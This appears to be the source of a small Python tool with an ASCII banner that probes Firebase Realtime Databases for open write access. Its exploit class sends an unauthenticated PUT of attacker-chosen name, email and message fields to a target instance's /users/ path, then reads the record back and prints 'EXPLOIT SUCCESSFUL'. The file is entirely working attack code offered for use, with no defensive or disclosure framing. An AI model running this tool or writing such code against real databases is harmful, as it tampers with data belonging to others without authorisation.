from urllib.request import urlopen
import requests
import json

# Color Codes Table
RED = '\033[91m'
BLUE = '\033[94m'
WHITE = '\033[97m'
GREEN = '\033[92m'
YELLOW = '\033[43m'

# Font Style Code Table
BOLD = '\033[1m'
NORMAL = '\033[0m'

def banner():
    print("""{}{}
   ____                _____        
  / __/_ __ ___  ___  / __(_)______ 
 / _/ \ \ // _ \/ _ \/ _// / __/ -_)
/___//_\_\/ .__/\___/_/ /_/_/  \__/ 
         /_/                        
         E.g https://<firebase DB Instanse>.firebaseio.com
{}""".format(BOLD, BLUE, NORMAL))

class exploit:
    def __init__(self, firebaseInstance, File, Name, Nick_Name, Email, Message):
        self.firebaseInstance = firebaseInstance
        self.File = File
        self.Name = Name
        self.Nick_Name = Nick_Name
        self.Email = Email
        self.Message = Message

    def firebaseExploit(self):
        print("\nVerfying if Exploit Successful...\n")
        firebaseInstanceUrl = "https://" + self.firebaseInstance + ".firebaseio.com/users/" + self.File + ".json"
        data = {"Exploit": "Successfull", "Name": self.Name, "Username": self.Nick_Name,"Email": self.Email, "Message": self.Message}
        response = requests.put(firebaseInstanceUrl, json=data)

        def showData(firebaseInstanceUrl):
            Url = urlopen(firebaseInstanceUrl)
            myfile = Url.read()
            jsonLoads = json.loads(myfile)
            jsonData = json.dumps(jsonLoads)
            print("\t{}[*]{} Data Uploaded on Database: \n".format(BLUE, NORMAL) + '\t\t--> ' + jsonData)

        # Response Codes
        try:
            if response.status_code == 200:
                print("{}[âœ“]{} EXPLOIT SUCCESSFUL".format(GREEN, NORMAL))
                print("\t{}[*]{} Exploited Url: {}".format(BLUE, NORMAL, firebaseInstanceUrl))
                showData(firebaseInstanceUrl)
            if response.status_code == 401:
                print("{}[x]{} NOT EXPLOITABLE".format(RED, NORMAL))
                print("{}[?]{} Reason: All Permissions Denied".format(RED, NORMAL))
            if response.status_code == 404:
                print("{}[x]{} Database Not Found".format(RED, NORMAL))
                print("{}[?]{} Reason: Firebase DB Not Found".format(RED, NORMAL))
        except:
            print("{}[x]{} NOT EXPLOITABLE".format(RED, NORMAL))
            print("{}[?]{} Reason: Unknown Error".format(RED, NORMAL))
        
